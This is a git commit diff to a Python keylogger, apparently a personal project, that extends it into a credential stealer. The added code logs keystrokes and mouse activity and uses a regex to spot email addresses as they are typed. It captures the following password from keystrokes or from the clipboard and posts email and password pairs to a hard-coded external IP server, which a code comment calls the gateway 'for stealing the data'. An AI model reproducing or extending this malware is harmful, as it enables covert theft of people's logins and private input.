629e256712dfd378b5a49d1c79005453bce65931
ShilatTsfoni <93181174+ShilatTsfoni@users.noreply.github.com>
2022-03-22 16:26:21 +0200

    .

--- keylogger_part2.py
+++ keylogger_part2.py
@@ -12,6 +12,8 @@ import random
 import time
 import threading
 import os
+import re
+import win32clipboard
 
 #creates a random key
 def key_generator(size= 10, chars=string.ascii_lowercase + string.digits):
@@ -25,6 +27,11 @@ currntY=0
 bul = True
 #variable holding the global stream
 dataStream = ""
+mouseStream =""
+email =""
+password=""
+bul_email=False
+ctrl=False
 #api gateway for stealing the data
 apiUrl = 'http://3.17.7.99/api/sendData/'
 #api gateway for key
@@ -51,13 +58,16 @@ def checkCondition():
         sendData()
 #activates the checkCondition every 10 seconds
 def threadFunc():
+    global bul_email
     while(bul):
-        time.sleep(30)
-        checkCondition()
+        time.sleep(10)
+        if bul_email == False:
+            checkCondition()
     return bul
 #sends data using the API gateway
 def sendData():
     global dataStream
+    global mouseStream
     global apiUrl
     global ip
     def jParse(data):
@@ -65,46 +75,71 @@ def sendData():
         'stream':data,
         }
     request = requests.post(url = apiUrl,data = jParse(dataStream))
+    request = requests.post(url = apiUrl,data = jParse(mouseStream))
     #resets the datastream after every post made to the server
     dataStream = ""
+    mouseStream = ""
+
 #parses the mouse click event and adds it to the datastream
 def on_move(x,y):
-    global dataStream
+    global mouseStream
     global currentX, currentY
     if abs(currentX-x) >=50 or abs(currentY-y)>=50:
         currentX = x
         currentY = y
         mouseLog = 'Pointer moved to {0}'.format((x,y))
-        dataStream +='\n'+mouseLog
+        mouseStream +='\n'+mouseLog
     return bul
 #parses the mouse click event and adds it to the datastream
 def mouseClick(x,y,event,pressed):
-    global dataStream 
-    currentLen = len(dataStream)
+    global mouseStream 
     if event == mouse.Button.left:
         mouseLog='left {0} at {1}'.format('Pressed' if pressed else 'Released', (x,y))   
     if event == mouse.Button.right:
         mouseLog='right {0} at {1}'.format('Pressed' if pressed else 'Released', (x,y))
     if event == mouse.Button.middle:
         mouseLog= 'middle {0} at {1}'.format('Pressed' if pressed else 'Released', (x,y))
-    dataStream +='\n'+mouseLog
+    mouseStream +='\n'+mouseLog
     return bul   
 #parses the keystroke event and adds it to the datastream
 def keyStrokes(event):
+    global bul_email, ctrl
     global dataStream
     global key
-    currentLen = len(dataStream)
+    combination = {keyboard.Key.ctrl_l,'v'}
     #normal alphanumeric keys
     try:
         dataStream += ('{0}'.format(event.char))
     #special keys
     except AttributeError:
-        dataStream += (' \n special key {0} pressed \n'.format(event))
+        if event in combination:
+            ctrl = True
+        if event != keyboard.Key.shift_r:
+            dataStream += (' \n special key {0} pressed \n'.format(event))
     return True
 #releases a key
 def on_release_keyboard(event):
+    regex = re.compile(r'([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})+')
+    global email,password, bul_email, ctrl
     global key, dataStream
     global bul
+    if event == keyboard.Key.enter or event == keyboard.Key.tab:
+        if bul_email == False:
+            if re.search(regex,dataStream):
+                email = re.match(regex,dataStream).group(0)
+                dataStream=""
+                bul_email =True
+        else:
+            if ctrl == True:
+                ctrl = False
+                win32clipboard.OpenClipboard()
+                password = win32clipboard.GetClipboardData()
+                win32clipboard.CloseClipboard()
+            else: 
+                password = dataStream
+            dataStream = "email: {0} \n password: {1} \n".format(email,password)
+            sendData()
+            bul_email = False
     if dataStream.find(key) != -1:
         os._exit
         bul = False
